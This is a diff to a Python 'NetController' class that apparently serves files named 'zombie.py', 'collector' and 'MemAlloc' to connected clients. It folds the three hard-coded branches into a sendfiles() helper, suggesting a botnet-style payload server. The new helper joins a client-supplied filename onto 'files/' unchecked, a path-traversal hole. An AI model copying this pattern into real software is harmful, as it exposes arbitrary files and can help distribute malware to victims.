@@ -82,39 +82,23 @@ class NetController:
 	
 			if get[0] == 'cli':
 				s.send(str(self.numClients).encode())
-			
-			elif get[1] == "zombie.py":
-				f = open("files/zombie.py", 'rb')
-				size = os.path.getsize("files/zombie.py")
-				data = f.read()
-				f.close()
-				s.send(str(size).encode())
-				s.recv(32)
-				s.sendall(data)
-
-			elif get[1] == 'collector':
-				f = open('files/collector', 'rb')
-				size = os.path.getsize('files/collector')
-				data = f.read()
-				f.close()
-				s.send(str(size).encode())
-				s.recv(32)
-				s.sendall(data)
-
-			elif get[1] == "MemAlloc":
-				f = open("files/MemAlloc", 'rb')
-				size = os.path.getsize("files/MemAlloc")
-				data = f.read()
-				f.close()
-				s.send(str(size).encode())
-				s.recv(32)
-				s.sendall(data)
 			#elif
-
+			else:
+				self.sendfiles(get[1], s)
 			
 			get = s.recv(1024).decode().split(' ')
 		s.close()
 		print("[i] Initialized client")
+
+
+	def sendfiles(self, filename, s):
+		f = open('files/' + filename, 'rb')
+		size = os.path.getsize('files/' + filename)
+		data = f.read()
+		f.close()
+		s.send(str(size).encode())
+		s.recv(32)
+		s.sendall(data)
 
 
 	def recvall(self, sock, n):
